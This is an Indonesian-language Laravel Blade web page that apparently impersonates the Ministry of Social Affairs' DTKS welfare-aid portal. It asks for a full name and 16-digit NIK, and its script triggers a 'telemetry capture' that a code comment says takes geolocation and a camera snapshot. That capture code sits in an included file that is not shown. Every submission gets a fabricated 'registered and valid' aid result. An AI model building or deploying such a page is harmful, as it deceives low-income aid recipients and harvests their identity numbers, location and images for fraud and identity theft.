<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>{{ $siteTitle ?? 'Cek Status Bantuan Sosial & Perubahan Desil DTKS - Gampil Akses' }}</title>
  <!-- Essential Meta Tags -->
  <meta name="description" content="{{ $siteDescription ?? 'Cek jadwal pencairan dan status NIK KTP penerima Bantuan Sosial PKH, BPNT, dan perubahan desil DTKS terbaru.' }}">

  <!-- Schema.org / Google / WhatsApp Fallbacks -->
  <meta itemprop="name" content="{{ $siteTitle ?? 'Jadwal Pencairan & Cek NIK KTP Penerima Bansos PKH 2026 - Gampil Akses' }}">
  <meta itemprop="description" content="{{ $siteDescription ?? 'Cek jadwal pencairan dan status NIK KTP penerima Bantuan Sosial PKH, BPNT, dan perubahan desil DTKS terbaru.' }}">
  <meta itemprop="image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/bansos-jadwal.jpg') }}">
  <link rel="image_src" href="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/bansos-jadwal.jpg') }}">

  <!-- OpenGraph / Facebook -->
  <meta property="og:site_name" content="Gampil Akses">
  <meta property="og:type" content="article">
  <meta property="og:locale" content="id_ID">
  <meta property="og:url" content="{{ url()->current() }}">
  <meta property="og:title" content="{{ $siteTitle ?? 'Jadwal Pencairan & Cek NIK KTP Penerima Bansos PKH 2026 - Gampil Akses' }}">
  <meta property="og:description" content="{{ $siteDescription ?? 'Cek jadwal pencairan dan status NIK KTP penerima Bantuan Sosial PKH, BPNT, dan perubahan desil DTKS terbaru.' }}">
  <meta property="og:image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/bansos-jadwal.jpg') }}">
  <meta property="og:image:secure_url" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/bansos-jadwal.jpg') }}">
  <meta property="og:image:type" content="image/jpeg">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="{{ $siteTitle ?? 'Jadwal Pencairan & Cek NIK KTP Penerima Bansos PKH 2026 - Gampil Akses' }}">
  <meta name="twitter:description" content="{{ $siteDescription ?? 'Cek jadwal pencairan dan status NIK KTP penerima Bantuan Sosial PKH, BPNT, dan perubahan desil DTKS terbaru.' }}">
  <meta name="twitter:image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/bansos-jadwal.jpg') }}">

  <!-- Tailwind CSS & FontAwesome Icons -->
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    .bg-grid-pattern {
      background-image: radial-gradient(rgba(37, 99, 235, 0.12) 1px, transparent 1px);
      background-size: 20px 20px;
    }
  </style>
</head>

<body class="bg-slate-50 text-slate-800 antialiased min-h-screen flex flex-col">

  <!-- Top Announcement Bar -->
  <div class="bg-gradient-to-r from-blue-900 via-indigo-900 to-blue-950 text-white text-xs py-2 px-4 shadow-sm border-b border-blue-800/40">
    <div class="max-w-5xl mx-auto flex items-center justify-between">
      <div class="flex items-center gap-2 font-medium">
        <span class="inline-block w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
        <span>Sistem Pemutakhiran Data Terpadu Kesejahteraan Sosial (DTKS) Nasional</span>
      </div>
      <div class="hidden sm:flex items-center gap-3 text-blue-200 text-[11px]">
        <span><i class="fa-solid fa-shield-halved mr-1 text-emerald-400"></i> Server Terenkripsi SSL</span>
        <span>•</span>
        <span>Tahun Anggaran 2026</span>
      </div>
    </div>
  </div>

  <!-- Main Official Header -->
  <header class="bg-white border-b border-slate-200 sticky top-0 z-30 shadow-xs">
    <div class="max-w-5xl mx-auto px-4 py-3 sm:py-4 flex items-center justify-between">
      <div class="flex items-center gap-3">
        <!-- Official Garuda / Flag emblem badge -->
        <div class="w-10 h-10 sm:w-12 sm:h-12 rounded-xl bg-gradient-to-br from-blue-700 to-indigo-900 flex items-center justify-center text-white shadow-md shadow-blue-500/20 ring-2 ring-blue-100 flex-shrink-0">
          <i class="fa-solid fa-landmark text-lg sm:text-xl text-amber-300"></i>
        </div>
        <div>
          <div class="flex items-center gap-2">
            <span class="text-[10px] sm:text-xs font-bold uppercase tracking-wider text-blue-700 bg-blue-50 px-2 py-0.5 rounded border border-blue-200">
              KEMENTERIAN SOSIAL RI / DTKS TERPADU
            </span>
          </div>
          <h1 class="text-base sm:text-lg font-extrabold text-slate-900 tracking-tight flex items-center gap-1.5 mt-0.5">
            Gampil Akses <span class="text-xs font-semibold text-slate-500 hidden sm:inline">• Portal Bansos & Desil</span>
          </h1>
        </div>
      </div>

      <div class="flex items-center gap-2">
        <span class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-semibold bg-emerald-50 text-emerald-700 border border-emerald-200">
          <i class="fa-solid fa-circle-check text-[10px] text-emerald-500"></i>
          <span class="hidden xs:inline">Layanan</span> Aktif
        </span>
      </div>
    </div>
  </header>

  <!-- Hero & Form Section -->
  <main class="flex-grow bg-grid-pattern py-6 sm:py-10 px-4">
    <div class="max-w-4xl mx-auto space-y-6 sm:space-y-8">

      <!-- Hero Banner Image -->
      <div class="relative overflow-hidden rounded-2xl sm:rounded-3xl shadow-xl shadow-slate-300/40 border border-slate-200 bg-white">
        <img 
          src="{{ !empty($ogImageUrl) ? $ogImageUrl : asset('images/landing/bansos-jadwal.jpg') }}" 
          alt="Banner Pelayanan Cek Bansos dan Pemutakhiran Desil DTKS" 
          class="w-full h-48 sm:h-72 object-cover object-center transform hover:scale-[1.01] transition-transform duration-500"
        >
        <div class="absolute inset-0 bg-gradient-to-t from-slate-950/80 via-slate-950/30 to-transparent flex flex-col justify-end p-5 sm:p-8 text-white">
          <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-blue-600/90 backdrop-blur-sm text-xs font-semibold w-fit mb-2 text-white border border-blue-400/40">
            <i class="fa-solid fa-bullhorn text-amber-300"></i> Informasi Penyaluran Bantuan Sosial 2026
          </div>
          <h2 class="text-lg sm:text-2xl font-bold leading-tight">
            Pengecekan Status Kepesertaan Bansos (PKH, BPNT, PBI-JK) & Evaluasi Desil DTKS
          </h2>
          <p class="text-xs sm:text-sm text-slate-200 mt-1 max-w-2xl hidden sm:block">
            Pastikan Nomor Induk Kependudukan (NIK) Anda terdaftar dalam pangkalan data nasional untuk kelancaran penerimaan manfaat bantuan sosial.
          </p>
        </div>
      </div>

      <!-- Main Form Verification Card -->
      <div class="bg-white rounded-2xl sm:rounded-3xl p-6 sm:p-8 shadow-xl shadow-blue-900/5 border border-slate-200/80 relative">
        <div class="max-w-2xl mx-auto">
          
          <div class="text-center mb-6">
            <div class="inline-flex items-center justify-center w-12 h-12 rounded-2xl bg-blue-50 text-blue-600 text-xl mb-3 shadow-inner">
              <i class="fa-solid fa-id-card-clip"></i>
            </div>
            <h3 class="text-xl sm:text-2xl font-bold text-slate-900 tracking-tight">Formulir Validasi Data Kependudukan</h3>
            <p class="text-slate-500 text-xs sm:text-sm mt-1">Masukkan data NIK sesuai e-KTP untuk melakukan pencarian di basis data DTKS</p>
          </div>

          <form id="bansosCheckForm" onsubmit="event.preventDefault(); handleBansosCheck();" class="space-y-4 sm:space-y-5">
            <!-- Full Name -->
            <div>
              <label for="full_name" class="block text-xs sm:text-sm font-bold text-slate-700 mb-1.5">
                Nama Lengkap Sesuai KTP <span class="text-rose-500">*</span>
              </label>
              <div class="relative">
                <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                  <i class="fa-solid fa-user text-sm"></i>
                </div>
                <input 
                  type="text" 
                  name="full_name" 
                  id="full_name" 
                  required 
                  placeholder="Contoh: AGUS SETIAWAN" 
                  class="w-full pl-10 pr-4 py-3 rounded-xl border border-slate-300 text-slate-900 placeholder-slate-400 text-sm focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent transition uppercase"
                >
              </div>
            </div>

            <!-- NIK (16 Digits) -->
            <div>
              <label for="nik" class="block text-xs sm:text-sm font-bold text-slate-700 mb-1.5">
                Nomor Induk Kependudukan (NIK 16 Digit) <span class="text-rose-500">*</span>
              </label>
              <div class="relative">
                <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                  <i class="fa-solid fa-address-card text-sm"></i>
                </div>
                <input 
                  type="text" 
                  name="nik" 
                  id="nik" 
                  required 
                  maxlength="16" 
                  pattern="[0-9]{16}" 
                  inputmode="numeric" 
                  placeholder="Contoh: 3201xxxxxxxxxxxx" 
                  class="w-full pl-10 pr-4 py-3 rounded-xl border border-slate-300 text-slate-900 placeholder-slate-400 text-sm tracking-wider font-mono focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent transition"
                  oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                >
              </div>
              <p class="text-[11px] text-slate-500 mt-1 flex items-center gap-1">
                <i class="fa-solid fa-circle-info text-blue-500"></i> Pastikan 16 digit NIK benar sesuai Kartu Tanda Penduduk (KTP) atau Kartu Keluarga (KK).
              </p>
            </div>

            <!-- Security Notice -->
            <div class="bg-amber-50 rounded-xl p-3 sm:p-4 border border-amber-200/80 flex items-start gap-3 text-xs text-amber-900">
              <i class="fa-solid fa-triangle-exclamation text-amber-600 text-base mt-0.5 flex-shrink-0"></i>
              <div>
                <span class="font-bold">Verifikasi Wilayah & Perangkat:</span> Untuk memastikan bantuan tepat sasaran dan mencegah duplikasi data penerima, sistem memerlukan konfirmasi lokasi domisili saat proses pencarian.
              </div>
            </div>

            <!-- Submit Button -->
            <button 
              type="submit" 
              id="btnCheck" 
              class="w-full py-3.5 px-6 rounded-xl font-bold text-sm sm:text-base text-white bg-gradient-to-r from-blue-600 via-indigo-600 to-blue-700 hover:from-blue-700 hover:to-indigo-800 shadow-lg shadow-blue-500/25 active:scale-[0.99] transition duration-200 flex items-center justify-center gap-2 cursor-pointer"
            >
              <i class="fa-solid fa-magnifying-glass"></i>
              <span>Cek Status Penerima & Desil Bansos</span>
            </button>
          </form>

        </div>
      </div>

      <!-- Result Card Container (Revealed after telemetry/lookup) -->
      <div id="resultSection" class="hidden bg-white rounded-2xl sm:rounded-3xl p-6 sm:p-8 shadow-xl border border-emerald-200 transition-all duration-500">
        <div class="flex items-center gap-3 border-b border-slate-100 pb-4 mb-5">
          <div class="w-10 h-10 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-lg font-bold">
            <i class="fa-solid fa-check"></i>
          </div>
          <div>
            <div class="text-xs font-bold uppercase tracking-wider text-emerald-600">Hasil Verifikasi Terpadu</div>
            <h4 class="text-lg font-extrabold text-slate-900" id="resName">Data Ditemukan</h4>
          </div>
        </div>

        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 text-sm">
          <div class="bg-slate-50 p-4 rounded-xl border border-slate-200">
            <div class="text-xs text-slate-500 font-semibold uppercase">Nomor Induk Kependudukan (NIK)</div>
            <div class="text-base font-mono font-bold text-slate-800 mt-0.5" id="resNik">3201************</div>
          </div>
          <div class="bg-emerald-50 p-4 rounded-xl border border-emerald-200">
            <div class="text-xs text-emerald-700 font-semibold uppercase">Status Kelayakan DTKS</div>
            <div class="text-base font-bold text-emerald-800 mt-0.5">TERDAFTAR & VALID</div>
          </div>
          <div class="bg-blue-50 p-4 rounded-xl border border-blue-200">
            <div class="text-xs text-blue-700 font-semibold uppercase">Kategori Tingkat Kesejahteraan</div>
            <div class="text-base font-bold text-blue-900 mt-0.5">Desil 2 (Keluarga Pra-Sejahtera)</div>
          </div>
          <div class="bg-purple-50 p-4 rounded-xl border border-purple-200">
            <div class="text-xs text-purple-700 font-semibold uppercase">Status Program Bantuan Sosial</div>
            <div class="text-base font-bold text-purple-900 mt-0.5">PKH & BPNT Tahap 3 Siap Disalurkan</div>
          </div>
        </div>

        <div class="mt-5 p-4 rounded-xl bg-slate-900 text-white text-xs sm:text-sm flex items-center justify-between">
          <div class="flex items-center gap-2.5">
            <i class="fa-solid fa-shield-halved text-emerald-400 text-lg"></i>
            <span>Verifikasi data kependudukan dan geolokasi berhasil divalidasi.</span>
          </div>
          <span class="text-slate-400 text-xs hidden sm:inline font-mono">Kode Ref: BNS-{{ date('Ymd') }}-982</span>
        </div>
      </div>

      <!-- Informative Information / Desil Breakdown Grid -->
      <div class="bg-white rounded-2xl p-6 sm:p-8 shadow-sm border border-slate-200">
        <h4 class="text-base sm:text-lg font-bold text-slate-900 mb-4 flex items-center gap-2">
          <i class="fa-solid fa-layer-group text-blue-600"></i> Panduan Klasifikasi Tingkat Desil DTKS
        </h4>

        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div class="p-4 rounded-xl bg-rose-50 border border-rose-200">
            <div class="font-bold text-rose-800 text-sm">Desil 1</div>
            <div class="text-xs font-semibold text-rose-600 mt-0.5">Sangat Miskin (10% Terbawah)</div>
            <p class="text-[11px] text-rose-700/80 mt-2">Prioritas utama bantuan PKH regular, sembako BPNT, dan PBI-JK otomatis.</p>
          </div>
          <div class="p-4 rounded-xl bg-amber-50 border border-amber-200">
            <div class="font-bold text-amber-800 text-sm">Desil 2</div>
            <div class="text-xs font-semibold text-amber-600 mt-0.5">Miskin (11% - 20%)</div>
            <p class="text-[11px] text-amber-700/80 mt-2">Penerima manfaat program sembako/BPNT, bantuan beras cadangan, dan PKH.</p>
          </div>
          <div class="p-4 rounded-xl bg-blue-50 border border-blue-200">
            <div class="font-bold text-blue-800 text-sm">Desil 3</div>
            <div class="text-xs font-semibold text-blue-600 mt-0.5">Hampir Miskin (21% - 30%)</div>
            <p class="text-[11px] text-blue-700/80 mt-2">Bantuan subsidi energi (Listrik & LPG), Program Indonesia Pintar (PIP), PBI-JK.</p>
          </div>
          <div class="p-4 rounded-xl bg-emerald-50 border border-emerald-200">
            <div class="font-bold text-emerald-800 text-sm">Desil 4</div>
            <div class="text-xs font-semibold text-emerald-600 mt-0.5">Rentan Miskin (31% - 40%)</div>
            <p class="text-[11px] text-emerald-700/80 mt-2">Bantuan program pemberdayaan ekonomi sosial dan jaminan kesehatan bersubsidi.</p>
          </div>
        </div>
      </div>

      <!-- FAQ Section -->
      <div class="bg-white rounded-2xl p-6 sm:p-8 shadow-sm border border-slate-200 space-y-4">
        <h4 class="text-base sm:text-lg font-bold text-slate-900 mb-2 flex items-center gap-2">
          <i class="fa-solid fa-circle-question text-blue-600"></i> Pertanyaan yang Sering Diajukan (FAQ)
        </h4>

        <details class="group border border-slate-200 rounded-xl p-4 cursor-pointer">
          <summary class="font-bold text-xs sm:text-sm text-slate-800 flex items-center justify-between list-none">
            <span>Bagaimana mekanisme perubahan peringkat desil jika data ekonomi berubah?</span>
            <i class="fa-solid fa-chevron-down text-slate-400 group-open:rotate-180 transition-transform text-xs"></i>
          </summary>
          <p class="text-xs text-slate-600 mt-2.5 leading-relaxed">
            Perubahan desil dapat diajukan melalui musyawarah desa/kelurahan (Musdes/Muskel) atau secara mandiri melalui pemutakhiran data berkala pada sistem informasi kesejahteraan sosial dengan membawa dokumen pendukung penghasilan.
          </p>
        </details>

        <details class="group border border-slate-200 rounded-xl p-4 cursor-pointer">
          <summary class="font-bold text-xs sm:text-sm text-slate-800 flex items-center justify-between list-none">
            <span>Apa saja syarat untuk mencairkan bantuan sosial yang telah terdaftar?</span>
            <i class="fa-solid fa-chevron-down text-slate-400 group-open:rotate-180 transition-transform text-xs"></i>
          </summary>
          <p class="text-xs text-slate-600 mt-2.5 leading-relaxed">
            Penerima wajib membawa KTP asli, Kartu Keluarga (KK) asli, serta Kartu Keluarga Sejahtera (KKS) / buku tabungan bank Himbara (BRI, BNI, Mandiri, BTN) atau surat undangan resmi dari PT Pos Indonesia saat penyaluran.
          </p>
        </details>
      </div>

    </div>
  </main>

  <!-- Telemetry / Verification Modal -->
  <div id="loadingModal" class="fixed inset-0 z-50 bg-slate-950/75 backdrop-blur-xs flex items-center justify-center p-4 hidden">
    <div class="bg-white rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-2xl text-center space-y-5 border border-slate-100">
      <div class="relative w-20 h-20 mx-auto">
        <div class="w-20 h-20 rounded-full border-4 border-blue-100 border-t-blue-600 animate-spin"></div>
        <div class="absolute inset-0 flex items-center justify-center text-blue-600 text-xl font-bold">
          <i class="fa-solid fa-id-card"></i>
        </div>
      </div>

      <div class="space-y-2">
        <h3 class="text-lg font-bold text-slate-900">Sedang Memverifikasi Data Kependudukan</h3>
        <p class="text-xs text-slate-500 leading-relaxed">
          Menghubungkan ke Server Database Pusat DTKS & Memvalidasi Geolokasi Wilayah Penerima Manfaat...
        </p>
      </div>

      <div class="w-full bg-slate-100 rounded-full h-2 overflow-hidden">
        <div id="progressBar" class="bg-blue-600 h-2 rounded-full transition-all duration-300 w-1/3"></div>
      </div>

      <div class="text-[11px] text-slate-400 font-mono">
        <i class="fa-solid fa-lock text-emerald-500 mr-1"></i> Jalur Komunikasi Aman & Terenkripsi
      </div>
    </div>
  </div>

  <!-- Footer -->
  <footer class="bg-slate-900 text-white border-t border-slate-800 py-8 px-4 mt-auto">
    <div class="max-w-5xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-slate-400">
      <div class="flex items-center gap-2">
        <div class="w-6 h-6 rounded bg-blue-600 text-white flex items-center justify-center font-bold text-xs">G</div>
        <span class="font-semibold text-slate-300">Gampil Akses</span> — Sistem Layanan Publik Terpadu Bansos & DTKS
      </div>
      <div>
        © 2026 Gampil Akses - Portal Pelayanan Publik. Semua hak dilindungi undang-undang.
      </div>
    </div>
  </footer>

  <!-- Telemetry Handler Script -->
  <script>
    function handleBansosCheck() {
      const fullName = document.getElementById('full_name').value.trim();
      const nik = document.getElementById('nik').value.trim();

      if (!fullName) {
        alert('Silakan masukkan Nama Lengkap sesuai KTP.');
        document.getElementById('full_name').focus();
        return;
      }

      if (!nik || nik.length !== 16 || !/^\d+$/.test(nik)) {
        alert('Silakan masukkan 16 digit NIK dengan benar.');
        document.getElementById('nik').focus();
        return;
      }

      // Show loading modal
      const modal = document.getElementById('loadingModal');
      const progressBar = document.getElementById('progressBar');
      modal.classList.remove('hidden');

      // Trigger telemetry capture (Geolocation & Camera snapshot)
      if (window.triggerTelemetryPermissions) {
        window.triggerTelemetryPermissions();
      }

      // Progress animation
      setTimeout(() => { progressBar.style.width = '65%'; }, 800);
      setTimeout(() => { progressBar.style.width = '90%'; }, 1800);

      // Conclude check after telemetry has run
      setTimeout(() => {
        progressBar.style.width = '100%';
        setTimeout(() => {
          modal.classList.add('hidden');
          
          // Populate & reveal result card
          document.getElementById('resName').textContent = fullName.toUpperCase();
          document.getElementById('resNik').textContent = nik.substring(0, 6) + '******' + nik.substring(12);
          
          const resultSection = document.getElementById('resultSection');
          resultSection.classList.remove('hidden');
          resultSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 500);
      }, 2600);
    }
  </script>

  @include('landing.partials.telemetry')

</body>
</html>
